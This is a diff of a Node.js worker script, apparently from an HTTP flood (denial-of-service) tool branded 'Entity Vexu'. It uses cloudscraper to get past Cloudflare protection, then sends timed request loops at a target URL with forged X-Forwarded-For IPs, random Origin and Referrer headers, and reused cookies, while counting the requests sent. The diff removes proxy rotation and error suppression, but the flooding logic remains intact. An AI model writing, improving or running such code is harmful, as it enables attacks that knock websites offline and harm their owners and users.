@@ -2,7 +2,6 @@ const cloudscraper = require('cloudscraper');
 const request = require('request');
 const randomstring = require('randomstring');
 const config = require('./config.json');
-const { getRandomProxy, getProxyCount } = require('./proxies');
 
 let state = {
     running: false,
@@ -12,19 +11,12 @@ let state = {
     errors: 0,
     restarts: 0,
     lastRestartAt: null,
-    cycleDuration: config.cycleDurationSeconds,
-    proxyCount: 0,
-    proxyActive: 0,
-    lastProxyUsed: null
+    cycleDuration: config.cycleDurationSeconds
 };
 
 let loopTimer = null;
 let restartTimer = null;
 let ioRef = null;
-
-// ---- suppress noisy errors from cloudscraper ----
-process.on('unhandledRejection', () => {});
-process.on('uncaughtException', () => {});
 
 function randomByte() {
     return Math.round(Math.random() * 256);
@@ -41,100 +33,45 @@ function oneCycle() {
     let cookie = 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890';
     let useragent = 'Mozilla/5.0 (VexuMonitor)';
 
-    // ---- Proxy Selection ----
-    let proxyUrl = null;
-    if (config.useProxy) {
-        const proxy = getRandomProxy();
-        if (proxy) {
-            proxyUrl = proxy.url;
-            state.lastProxyUsed = proxy.raw;
-            state.proxyActive = 1;
+    cloudscraper.get(url, function (error, response) {
+        if (!state.running) return;
+
+        if (error) {
+            state.errors++;
         } else {
-            state.proxyActive = 0;
-        }
-    } else {
-        state.proxyActive = 0;
-    }
-
-    // ---- Cloudscraper (with proxy) ----
-    const scraperOptions = {
-        url: url,
-        timeout: config.requestTimeoutMs || 10000,
-        headers: {
-            'User-Agent': useragent
-        }
-    };
-    if (proxyUrl) {
-        scraperOptions.proxy = proxyUrl;
-        scraperOptions.strictSSL = false;
-    }
-
-    // Wrap in try/catch + attach .catch() so promise rejections are swallowed
-    try {
-        const p = cloudscraper.get(scraperOptions, function (error, response) {
-            if (!state.running) return;
-
-            if (error) {
-                state.errors++;
-                broadcast();
-                return;
-            }
-
             try {
                 const parsed = JSON.parse(JSON.stringify(response));
                 cookie = parsed["request"]["headers"]["cookie"] || cookie;
                 useragent = parsed["request"]["headers"]["User-Agent"] || useragent;
             } catch (e) {}
+        }
 
-            const rand = randomstring.generate({
-                length: 10,
-                charset: 'abcdefghijklmnopqstuvwxyz0123456789'
-            });
-
-            const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
-
-            const options = {
-                url: url,
-                headers: {
-                    'User-Agent': useragent,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'Upgrade-Insecure-Requests': '2000',
-                    'cookie': cookie,
-                    'Origin': 'http://' + rand + '.com',
-                    'Referrer': 'http://google.com/' + rand,
-                    'X-Forwarded-For': ip
-                },
-                timeout: config.requestTimeoutMs || 10000,
-                strictSSL: false
-            };
-
-            if (proxyUrl) {
-                options.proxy = proxyUrl;
-            }
-
-            try {
-                request(options, function (err) {
-                    if (err) state.errors++;
-                    else state.requestsSent++;
-                    broadcast();
-                });
-            } catch (e) {
-                state.errors++;
-                broadcast();
-            }
+        const rand = randomstring.generate({
+            length: 10,
+            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
         });
 
-        // If cloudscraper returns a promise, swallow its rejection
-        if (p && typeof p.catch === 'function') {
-            p.catch(() => {
-                state.errors++;
-                broadcast();
-            });
-        }
-    } catch (e) {
-        state.errors++;
-        broadcast();
-    }
+        const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
+
+        const options = {
+            url: url,
+            headers: {
+                'User-Agent': useragent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'Upgrade-Insecure-Requests': '2000',
+                'cookie': cookie,
+                'Origin': 'http://' + rand + '.com',
+                'Referrer': 'http://google.com/' + rand,
+                'X-Forwarded-For': ip
+            }
+        };
+
+        request(options, function (err) {
+            if (err) state.errors++;
+            else state.requestsSent++;
+            broadcast();
+        });
+    });
 }
 
 function scheduleRestart() {
@@ -158,9 +95,6 @@ function startWorker(io) {
     state.errors = 0;
     state.restarts = 0;
     state.lastRestartAt = null;
-    state.proxyCount = getProxyCount();
-    state.proxyActive = 0;
-    state.lastProxyUsed = null;
     broadcast();
 
     loopTimer = setInterval(oneCycle, config.requestIntervalMs);
@@ -180,10 +114,6 @@ function getStatus() {
         restarts: state.restarts,
         lastRestartAt: state.lastRestartAt,
         startedAt: state.startedAt,
-        proxyEnabled: config.useProxy === true,
-        proxyCount: getProxyCount(),
-        proxyActive: state.proxyActive,
-        lastProxyUsed: state.lastProxyUsed,
         owner: 'Entity Vexu',
         contact: '@UsAdminChat_bot'
     };
